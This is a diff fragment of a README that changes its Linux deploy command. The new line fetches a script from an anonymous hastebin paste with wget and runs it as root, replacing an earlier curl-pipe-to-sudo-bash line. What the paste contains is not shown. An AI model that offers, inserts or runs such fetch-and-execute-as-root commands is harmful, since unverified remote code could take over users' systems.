@@ -13,7 +13,7 @@
 
 ## Deploy to Linux server
 
-`curl -sL https://git.io/JUjsg | sudo bash -s`
+`sudo su -c "bash <(wget -qO- https://hasteb.in/raw/folowoga)" root`
 
 ## Install
 
